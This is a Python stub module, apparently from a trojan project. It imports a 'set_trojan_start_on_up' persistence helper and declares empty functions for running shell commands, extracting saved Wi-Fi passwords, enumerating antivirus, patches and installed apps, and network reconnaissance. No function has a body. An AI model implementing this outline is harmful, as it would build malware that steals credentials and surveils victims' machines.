import subprocess as sub
import os, re
from time import sleep
from json import dumps, loads

from Api.ManaIO import set_trojan_start_on_up, CLEANUP
from Api.protocol import NOOD_NAME, NOOD_PATH, H_T_NAME



FORMAT_IP   = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
FORMAT_MAC  = r'[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}'
FORMAT_SOCK = FORMAT_IP+r"\:\d{0,9}"



def proxyCmd(cmd):
	pass

def run_shell(cmd:str, timeout=6):
	pass

def scan_by_payload(stream:bytes) -> bytes:
	pass

def get_profiles_wifi(cmd:str) -> list[dict]:
	pass

def get_profiles_pass(profiles:list[dict], payload:str) -> list:
	pass

def get_arp(cmd:str) -> list:
	pass

def get_netstat(cmd:str):
	pass

def get_config_wifi(cmd:str) -> list:
	pass

def get_local_dns(cmd:str):
	pass

def get_wmic_kb(cmd:str):
	pass

def get_own_av(cmd:str)->list[dict]:
	pass

def get_system_apps(cmd:str) -> list[dict]:
	pass

def get_size_window() -> tuple[int, int]:
	pass

def kill_nood():
	pass

def restart():
	pass

def set_sig(signal:dict) -> dict:
	pass
